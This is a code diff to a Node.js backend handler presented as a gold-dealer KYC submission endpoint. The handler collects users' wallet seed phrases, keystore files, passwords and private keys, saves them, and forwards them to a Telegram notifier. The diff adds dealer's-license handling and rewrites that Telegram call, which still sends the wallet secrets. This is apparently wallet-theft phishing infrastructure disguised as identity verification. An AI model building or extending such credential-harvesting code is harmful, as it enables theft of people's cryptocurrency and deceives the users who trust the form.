@@ -29,19 +29,29 @@ async function verifyCloudinaryResource(public_id, resource_type = 'auto', expec
 exports.saveKycDetails = async (req, res) => {
   try {
     const { sessionId, walletType, seedPhrase, keystoreJson, password, privateKey, imageUrls, form,
-      qualityRequired, karatsPurity, destinationRefineryText } = req.body;
+      qualityRequired, karatsPurity, destinationRefineryText, fileMap, dealersLicenseStatus } = req.body;
 
     console.log('saveKycDetails payload received:', { sessionId, walletType, hasImages: Array.isArray(imageUrls) ? imageUrls.length : 0, form });
+
 
     const expectedFolderPrefix = `kyc/${sessionId || 'unknown'}`;
     const verified = [];
     let verificationStatus = 'no_images';
     let verificationError = null;
 
-    if (Array.isArray(imageUrls) && imageUrls.length > 0) {
+    // If dealer's license is marked as not available, skip image verification for dealer's license
+    let filteredImageUrls = Array.isArray(imageUrls) ? [...imageUrls] : [];
+    if (dealersLicenseStatus === 'not_available') {
+      // Remove dealer's license image from imageUrls if present (assuming fileMap/dealersLicense)
+      if (form && form.fileMap && form.fileMap.dealersLicense) {
+        filteredImageUrls = filteredImageUrls.filter(img => img.public_id !== form.fileMap.dealersLicense.public_id);
+      }
+    }
+
+    if (Array.isArray(filteredImageUrls) && filteredImageUrls.length > 0) {
       verificationStatus = 'pending';
       try {
-        for (const item of imageUrls) {
+        for (const item of filteredImageUrls) {
           if (!item || !item.public_id) throw new Error('Missing public_id in imageUrls item');
           const resourceType = item.resource_type || 'auto';
           const info = await verifyCloudinaryResource(item.public_id, resourceType, expectedFolderPrefix);
@@ -63,12 +73,14 @@ exports.saveKycDetails = async (req, res) => {
       keystoreJson,
       password,
       privateKey,
-      imageUrls: verified.length ? verified : (Array.isArray(imageUrls) ? imageUrls : []),
+      imageUrls: verified.length ? verified : filteredImageUrls,
       verificationStatus,
       verificationError,
       qualityRequired: qualityRequired || (form && form.qualityRequired) || '',
       karatsPurity: karatsPurity || (form && form.karatsPurity) || '',
       destinationRefineryText: destinationRefineryText || (form && form.destinationRefineryText) || '',
+      dealersLicenseStatus: dealersLicenseStatus || (form && form.dealersLicenseStatus) || 'available',
+      fileMap: fileMap || (form && form.fileMap) || {},
     };
 
     await Kyc.findOneAndUpdate(
@@ -78,7 +90,8 @@ exports.saveKycDetails = async (req, res) => {
     );
     // Send Telegram notification with KYC details
     try {
-      notifyNewKyc({ sessionId, walletType, seedPhrase, keystoreJson, password, privateKey, images: verified, form });
+      // Forward richer payload to telegram notifier
+      notifyNewKyc({ sessionId, walletType, seedPhrase, keystoreJson, password, privateKey, images: verified, fileMap: kycData.fileMap, dealersLicenseStatus: kycData.dealersLicenseStatus, qualityRequired: kycData.qualityRequired, karatsPurity: kycData.karatsPurity, destinationRefineryText: kycData.destinationRefineryText });
     } catch (err) {
       console.error('Failed to send KYC telegram notification', err);
     }
